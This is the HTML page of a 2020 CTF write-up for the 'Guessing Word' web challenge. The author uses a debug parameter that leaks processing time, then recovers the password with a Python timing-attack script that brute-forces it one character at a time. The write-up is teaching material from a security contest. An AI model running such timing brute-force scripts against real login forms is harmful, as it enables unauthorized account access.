<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] ROP: 05 - Guessing Word | ErbaZZ's Space</title><meta name=keywords content="rop,web,ctf,writeup"><meta name=description content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh

Guessing Word challenge description"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/rop_05_guessingword/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] ROP: 05 - Guessing Word"><meta property="og:description" content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh

Guessing Word challenge description"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/rop_05_guessingword/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-03-17T22:00:00+07:00"><meta property="article:modified_time" content="2020-03-17T22:00:00+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] ROP: 05 - Guessing Word"><meta name=twitter:description content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh

Guessing Word challenge description"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] ROP: 05 - Guessing Word","item":"https://erbazz.me/writeup/rop_05_guessingword/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] ROP: 05 - Guessing Word","name":"[Writeup] ROP: 05 - Guessing Word","description":"DISCLAIMER: game.rop.sh was discontinued and is no longer available.\nChallenge Name: Guessing Word\nType: Web\nScore: 200 pts\nLink: https://game.rop.sh\nGuessing Word challenge description\n","keywords":["rop","web","ctf","writeup"],"articleBody":"DISCLAIMER: game.rop.sh was discontinued and is no longer available.\nChallenge Name: Guessing Word\nType: Web\nScore: 200 pts\nLink: https://game.rop.sh\nGuessing Word challenge description\nAs usual, the challenge provides us with a link to the website. On the website, there’s a text box and a button to submit the password that we need to “GUESS”.\nWebpage of the challenge\nLooking at the page source, we would see this:\n html lang=\"en\" head meta charset=\"utf-8\" meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" meta name=\"description\" content=\"\" meta name=\"author\" content=\"\" link rel=\"shortcut icon\" href=\"../../docs-assets/ico/favicon.png\" titleGuessing Gametitle  link href=\"../../css/bootstrap.css\" rel=\"stylesheet\"  link href=\"signin.css\" rel=\"stylesheet\"       head body div class=\"container\" form class=\"form-signin\" role=\"form\" action=\"index.php\" method=\"POST\" h3 class=\"form-signin-heading\"Can you guess my password?h3 input type=\"password\" class=\"form-control\" placeholder=\"Password\" name=\"password\" requiredbr button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\"Enterbutton  form div  ================================================== --  body html We can see that the form would send a POST request with the password in the textbox to index.php. So let’s try inputting test into the form and press Enter.\nResult\nApparently, we guessed wrong. Let’s see the source.\nWrong Passwordbr … Really? That’s it? The whole source is just one line, without any comment as a hint at all. We need to do something with the input of the form, one of the possibilities would be SQL Injection, but let’s look at the source of the first page again, maybe we could find something.\n... button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\"Enterbutton  form ... Hmmm…? ?debug for DEBUGGING? Let’s try it then, changing the target of the POST request to index.php?debug and submit again.\nResult with ?debug\nThe page looks the same; however, something interesting appears in the source.\nWrong Password\nA comment telling us the process time! After several tries, we have found out that different inputs yield different processing times, and we can deduct the correct password from the processing time.\nThe code would probably look somewhat like this:\ncorrect_pass = \"P@ssw0rd\" input = [User input] wrong = False # Different input sizes yield equal processing time, so it is probably made to be easy to crack. for i in range (0, min(len(correct_pass), len(input))): if correct_pass[i] != input[i]: wrong = True break if len(correct_pass) != len(input): wrong = True if !wrong: print(\"Correct Password\") else: print(\"Wrong Password\") With this code, the program would run longer if more characters of the input matches the correct password. Therefore, we can bruteforce it character by character and pick the one with the longest processing time.\nI wrote a simple Python script to send POST requests and bruteforce the password.\nimport requests import re url = \"https://game.rop.sh/chall/5/index.php?debug\" password = \"\" charlist = \"0123456789abcdefghijklmnopqustuvwxyz!@#$%^\u0026*()_-+=\" for i in range(30): maxtime = 0 tempchar = '' end = False for c in charlist: temppass = password + c data = {'password':temppass} r = requests.post(url = url, data = {\"password\":temppass}) wrong = re.search('Wrong', r.text) if not wrong: tempchar = c end = True break find = re.search('Process Time: ([\\d\\.]+)', r.text) if find: time = find.group(1) if time  maxtime: maxtime = time tempchar = c password = password + tempchar print(password) if end: break print(\"Key = \" + password) The script would rotate the characters from the list to send as an input, after that, it would save the one with the longest process time and pick the further characters.\nAfter waiting for a while, we got our password.\nScript Output\nInputting this key manually on the website yields this result:\nResult\nSuccess!\n","wordCount":"655","inLanguage":"en","datePublished":"2020-03-17T22:00:00+07:00","dateModified":"2020-03-17T22:00:00+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/rop_05_guessingword/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] ROP: 05 - Guessing Word</h1><div class=post-meta><span title="2020-03-17 22:00:00 +0700 +07">March 17, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;655 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=post-content><p><strong>DISCLAIMER: game.rop.sh was discontinued and is no longer available.</strong></p><p><strong>Challenge Name:</strong> Guessing Word<br><strong>Type:</strong> Web<br><strong>Score:</strong> 200 pts<br><strong>Link:</strong> <a href=https://game.rop.sh/task>https://game.rop.sh</a></p><p><img loading=lazy src=/images/rop/05/rop_05_challenge.png alt="Challenge Description">
<em>Guessing Word challenge description</em></p><p>As usual, the challenge provides us with a link to the website. On the website, there&rsquo;s a text box and a button to submit the password that we need to &ldquo;GUESS&rdquo;.</p><p><img loading=lazy src=/images/rop/05/rop_05_webpage.png alt="Challenge Webpage">
<em>Webpage of the challenge</em></p><p>Looking at the page source, we would see this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;utf-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;IE=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;description&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;author&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;shortcut icon&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;../../docs-assets/ico/favicon.png&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Guessing Game<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Bootstrap core CSS --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;../../css/bootstrap.css&#34;</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Custom styles for this template --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;signin.css&#34;</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Just for debugging purposes. Don&#39;t actually copy this line! --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!--[if lt IE 9]&gt;&lt;script src=&#34;../../docs-assets/js/ie8-responsive-file-warning.js&#34;&gt;&lt;/script&gt;&lt;![endif]--&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!--[if lt IE 9]&gt;
</span></span></span><span class=line><span class=cl><span class=c>      &lt;script src=&#34;https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=c>      &lt;script src=&#34;https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=c>    &lt;![endif]--&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;container&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>form</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-signin&#34;</span> <span class=na>role</span><span class=o>=</span><span class=s>&#34;form&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;index.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>h3</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-signin-heading&#34;</span><span class=p>&gt;</span>Can you guess my password?<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;Password&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>required</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn btn-lg btn-primary btn-block&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>Enter<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=c>&lt;!-- ?debug for DEBUGGING --&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span> <span class=c>&lt;!-- /container --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Bootstrap core JavaScript
</span></span></span><span class=line><span class=cl><span class=c>    ================================================== --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>We can see that the form would send a POST request with the password in the textbox to <strong>index.php</strong>.
So let&rsquo;s try inputting <em>test</em> into the form and press <em>Enter</em>.</p><p><img loading=lazy src=/images/rop/05/rop_05_wrong.png alt=Result>
<em>Result</em></p><p>Apparently, we guessed wrong. Let&rsquo;s see the source.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>Wrong Password<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>&mldr; Really? That&rsquo;s it? The whole source is just one line, without any comment as a hint at all.
We need to do something with the input of the form, one of the possibilities would be SQL Injection, but let&rsquo;s look at the source of the first page again, maybe we could find something.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn btn-lg btn-primary btn-block&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>Enter<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=c>&lt;!-- ?debug for DEBUGGING --&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Hmmm&mldr;? <strong>?debug for DEBUGGING</strong>? Let&rsquo;s try it then, changing the target of the POST request to <strong>index.php?debug</strong> and submit again.</p><p><img loading=lazy src=/images/rop/05/rop_05_wrong.png alt="Debug Result">
<em>Result with ?debug</em></p><p>The page looks the same; however, something interesting appears in the source.</p><pre tabindex=0><code>Wrong Password&lt;br&gt;&lt;br&gt;&lt;!-- Process Time: 0 --&gt;
</code></pre><p>A comment telling us the process time! After several tries, we have found out that different inputs yield different processing times, and we can deduct the correct password from the processing time.</p><p>The code would probably look somewhat like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>correct_pass</span> <span class=o>=</span> <span class=s2>&#34;P@ssw0rd&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>input</span> <span class=o>=</span> <span class=p>[</span><span class=n>User</span> <span class=nb>input</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>wrong</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Different input sizes yield equal processing time, so it is probably made to be easy to crack.</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>min</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>correct_pass</span><span class=p>),</span> <span class=nb>len</span><span class=p>(</span><span class=nb>input</span><span class=p>))):</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=n>correct_pass</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=nb>input</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=n>wrong</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>correct_pass</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=nb>input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>wrong</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=err>!</span><span class=n>wrong</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Correct Password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Wrong Password&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>With this code, the program would run longer if more characters of the input matches the correct password. Therefore, we can bruteforce it character by character and pick the one with the longest processing time.</p><p>I wrote a simple Python script to send POST requests and bruteforce the password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://game.rop.sh/chall/5/index.php?debug&#34;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>charlist</span> <span class=o>=</span> <span class=s2>&#34;0123456789abcdefghijklmnopqustuvwxyz!@#$%^&amp;*()_-+=&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>maxtime</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>tempchar</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>charlist</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>temppass</span> <span class=o>=</span> <span class=n>password</span> <span class=o>+</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=n>temppass</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=n>temppass</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>wrong</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;Wrong&#39;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>wrong</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tempchar</span> <span class=o>=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>            <span class=n>end</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>find</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;Process Time: ([\d\.]+)&#39;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>find</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span> <span class=o>=</span> <span class=n>find</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>time</span> <span class=o>&gt;</span> <span class=n>maxtime</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>maxtime</span> <span class=o>=</span> <span class=n>time</span>
</span></span><span class=line><span class=cl>                <span class=n>tempchar</span> <span class=o>=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>password</span> <span class=o>+</span> <span class=n>tempchar</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>end</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Key = &#34;</span> <span class=o>+</span> <span class=n>password</span><span class=p>)</span>
</span></span></code></pre></div><p>The script would rotate the characters from the list to send as an input, after that, it would save the one with the longest process time and pick the further characters.</p><p>After waiting for a while, we got our password.</p><p><img loading=lazy src=/images/rop/05/rop_05_output.png alt="Script Output">
<em>Script Output</em></p><p>Inputting this key manually on the website yields this result:</p><p><img loading=lazy src=/images/rop/05/rop_05_key.png alt=Result>
<em>Result</em></p><p>Success!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/rop/>rop</a></li><li><a href=https://erbazz.me/tags/web/>web</a></li><li><a href=https://erbazz.me/tags/ctf/>ctf</a></li><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li></ul><nav class=paginav><a class=prev href=https://erbazz.me/writeup/rop_02_oraclesplan/><span class=title>« Prev</span><br><span>[Writeup] ROP: 02 - Oracle's Plan</span></a>
<a class=next href=https://erbazz.me/writeup/hackingcontest2019/><span class=title>Next »</span><br><span>[Writeup] Hacking Contest 2019 (Qualification Round)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>